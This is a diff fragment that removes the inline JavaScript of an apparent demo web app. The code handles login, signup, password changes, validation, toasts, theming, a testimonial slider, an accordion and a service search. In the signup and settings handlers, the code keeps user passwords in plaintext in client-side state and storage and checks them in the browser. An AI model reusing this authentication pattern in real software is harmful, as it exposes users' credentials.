-                showToast(`Welcome back, ${user.name}!`, 'success');
-                showPage('dashboard');
-                
-                // Reset form
-                e.target.reset();
-            } else {
-                showToast('Invalid email or password', 'error');
-            }
-        }
-
-        function handleSignup(e) {
-            e.preventDefault();
-            
-            const name = document.getElementById('signupName').value;
-            const email = document.getElementById('signupEmail').value;
-            const password = document.getElementById('signupPassword').value;
-            const confirmPassword = document.getElementById('signupConfirmPassword').value;
-            const agreeTerms = document.getElementById('agreeTerms').checked;
-
-            // Validation
-            if (!validateEmail(email)) {
-                showToast('Please enter a valid email address', 'error');
-                return;
-            }
-
-            if (!validatePassword(password)) {
-                showToast('Password must be at least 8 characters with a number and special character', 'error');
-                return;
-            }
-
-            if (password !== confirmPassword) {
-                showToast('Passwords do not match', 'error');
-                return;
-            }
-
-            if (!agreeTerms) {
-                showToast('Please agree to the terms and conditions', 'error');
-                return;
-            }
-
-            // Check if user already exists
-            if (AppState.users.find(u => u.email === email)) {
-                showToast('An account with this email already exists', 'error');
-                return;
-            }
-
-            // Create new user
-            const newUser = {
-                id: Date.now(),
-                name,
-                email,
-                password,
-                createdAt: new Date().toISOString()
-            };
-
-            AppState.users.push(newUser);
-            saveUsersToStorage();
-
-            // Auto login
-            AppState.currentUser = newUser;
-            AppState.isLoggedIn = true;
-            saveLoginSession(newUser, true);
-            updateUIForLoggedInUser();
-
-            document.getElementById('signupModal').classList.remove('active');
-            showToast(`Account created successfully! Welcome, ${name}!`, 'success');
-            showPage('dashboard');
-
-            // Reset form
-            e.target.reset();
-        }
-
-        function handleContact(e) {
-            e.preventDefault();
-            
-            const name = document.getElementById('contactName').value;
-            const email = document.getElementById('contactEmail').value;
-            const subject = document.getElementById('contactSubject').value;
-            const message = document.getElementById('contactMessage').value;
-
-            // Simulate sending message
-            setTimeout(() => {
-                showToast('Message sent successfully! We\'ll get back to you soon.', 'success');
-                e.target.reset();
-            }, 500);
-        }
-
-        function handleSettingsUpdate(e) {
-            e.preventDefault();
-            
-            const currentPassword = document.getElementById('currentPassword').value;
-            const newPassword = document.getElementById('newPassword').value;
-            const confirmPassword = document.getElementById('confirmPassword').value;
-
-            if (!currentPassword || !newPassword || !confirmPassword) {
-                showToast('Please fill in all password fields', 'error');
-                return;
-            }
-
-            if (currentPassword !== AppState.currentUser.password) {
-                showToast('Current password is incorrect', 'error');
-                return;
-            }
-
-            if (newPassword !== confirmPassword) {
-                showToast('New passwords do not match', 'error');
-                return;
-            }
-
-            if (!validatePassword(newPassword)) {
-                showToast('Password must be at least 8 characters with a number and special character', 'error');
-                return;
-            }
-
-            // Update password
-            AppState.currentUser.password = newPassword;
-            const userIndex = AppState.users.findIndex(u => u.id === AppState.currentUser.id);
-            if (userIndex !== -1) {
-                AppState.users[userIndex] = AppState.currentUser;
-                saveUsersToStorage();
-            }
-
-            showToast('Password updated successfully', 'success');
-            e.target.reset();
-        }
-
-        // ==================== VALIDATION ====================
-        function validateEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(email);
-        }
-
-        function validatePassword(password) {
-            // At least 8 characters, one number, one special character
-            const re = /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/;
-            return re.test(password);
-        }
-
-        function updatePasswordStrength() {
-            const password = document.getElementById('signupPassword').value;
-            const strengthBar = document.getElementById('passwordStrengthBar');
-            
-            let strength = 0;
-            if (password.length >= 8) strength++;
-            if (/[a-z]/.test(password) && /[A-Z]/.test(password)) strength++;
-            if (/[0-9]/.test(password)) strength++;
-            if (/[!@#$%^&*]/.test(password)) strength++;
-
-            strengthBar.className = 'password-strength-bar';
-            
-            if (strength <= 1) {
-                strengthBar.classList.add('weak');
-            } else if (strength <= 3) {
-                strengthBar.classList.add('medium');
-            } else {
-                strengthBar.classList.add('strong');
-            }
-        }
-
-        function updateSettingsPasswordStrength() {
-            const password = document.getElementById('newPassword').value;
-            const strengthBar = document.getElementById('settingsPasswordBar');
-            
-            let strength = 0;
-            if (password.length >= 8) strength++;
-            if (/[a-z]/.test(password) && /[A-Z]/.test(password)) strength++;
-            if (/[0-9]/.test(password)) strength++;
-            if (/[!@#$%^&*]/.test(password)) strength++;
-
-            strengthBar.className = 'password-strength-bar';
-            
-            if (strength <= 1) {
-                strengthBar.classList.add('weak');
-            } else if (strength <= 3) {
-                strengthBar.classList.add('medium');
-            } else {
-                strengthBar.classList.add('strong');
-            }
-        }
-
-        // ==================== TOAST NOTIFICATIONS ====================
-        function showToast(message, type = 'success') {
-            const toast = document.getElementById('toast');
-            const toastTitle = document.getElementById('toastTitle');
-            const toastMessage = document.getElementById('toastMessage');
-            const toastIcon = toast.querySelector('.toast-icon');
-
-            toast.className = 'toast ' + type;
-            
-            if (type === 'success') {
-                toastTitle.textContent = 'Success';
-                toastIcon.className = 'fas fa-check-circle toast-icon';
-            } else if (type === 'error') {
-                toastTitle.textContent = 'Error';
-                toastIcon.className = 'fas fa-exclamation-circle toast-icon';
-            } else if (type === 'warning') {
-                toastTitle.textContent = 'Warning';
-                toastIcon.className = 'fas fa-exclamation-triangle toast-icon';
-            }
-
-            toastMessage.textContent = message;
-            toast.classList.add('active');
-
-            setTimeout(() => {
-                toast.classList.remove('active');
-            }, 3000);
-        }
-
-        // ==================== THEME ====================
-        function initTheme() {
-            const savedTheme = localStorage.getItem('theme') || 'light';
-            AppState.theme = savedTheme;
-            
-            if (savedTheme === 'dark') {
-                document.documentElement.setAttribute('data-theme', 'dark');
-                document.getElementById('themeCheckbox').checked = true;
-                document.getElementById('darkModeToggle').checked = true;
-            }
-        }
-
-        function toggleTheme() {
-            const newTheme = AppState.theme === 'light' ? 'dark' : 'light';
-            AppState.theme = newTheme;
-            
-            document.documentElement.setAttribute('data-theme', newTheme);
-            localStorage.setItem('theme', newTheme);
-            
-            // Sync both toggle switches
-            document.getElementById('themeCheckbox').checked = newTheme === 'dark';
-            document.getElementById('darkModeToggle').checked = newTheme === 'dark';
-        }
-
-        // ==================== TESTIMONIAL SLIDER ====================
-        function startTestimonialSlider() {
-            const track = document.getElementById('testimonialTrack');
-            const dots = document.querySelectorAll('.slider-dot');
-            
-            dots.forEach(dot => {
-                dot.addEventListener('click', function() {
-                    const slideIndex = parseInt(this.dataset.slide);
-                    goToSlide(slideIndex);
-                });
-            });
-
-            // Auto slide every 5 seconds
-            setInterval(() => {
-                AppState.testimonialIndex = (AppState.testimonialIndex + 1) % 3;
-                goToSlide(AppState.testimonialIndex);
-            }, 5000);
-        }
-
-        function goToSlide(index) {
-            const track = document.getElementById('testimonialTrack');
-            const dots = document.querySelectorAll('.slider-dot');
-            
-            track.style.transform = `translateX(-${index * 100}%)`;
-            
-            dots.forEach(dot => dot.classList.remove('active'));
-            dots[index].classList.add('active');
-            
-            AppState.testimonialIndex = index;
-        }
-
-        // ==================== ACCORDION ====================
-        function initAccordion() {
-            document.querySelectorAll('.accordion-header').forEach(header => {
-                header.addEventListener('click', function() {
-                    const item = this.parentElement;
-                    const content = item.querySelector('.accordion-content');
-                    const isActive = item.classList.contains('active');
-
-                    // Close all accordions
-                    document.querySelectorAll('.accordion-item').forEach(i => {
-                        i.classList.remove('active');
-                        i.querySelector('.accordion-content').style.maxHeight = null;
-                    });
-
-                    // Open clicked accordion if it was closed
-                    if (!isActive) {
-                        item.classList.add('active');
-                        content.style.maxHeight = content.scrollHeight + 'px';
-                    }
-                });
-            });
-        }
-
-        // ==================== SEARCH ====================
-        function handleServiceSearch(e) {
-            const searchTerm = e.target.value.toLowerCase();
-            const serviceCards = document.querySelectorAll('#servicesGrid .feature-card');
-
-            serviceCards.forEach(card => {
-                const serviceName = card.querySelector('h3').textContent.toLowerCase();
-                const serviceDesc = card.querySelector('p').textContent.toLowerCase();
-                
-                if (serviceName.includes(searchTerm) || serviceDesc.includes(searchTerm)) {
-                    card.style.display = 'block';
-                } else {
-                    card.style.display = 'none';
-                }
-            });
-        }
-
-        // ==================== START APPLICATION ====================
-        document.addEventListener('DOMContentLoaded', initApp);
+        });
     </script>
 </body>
 </html>
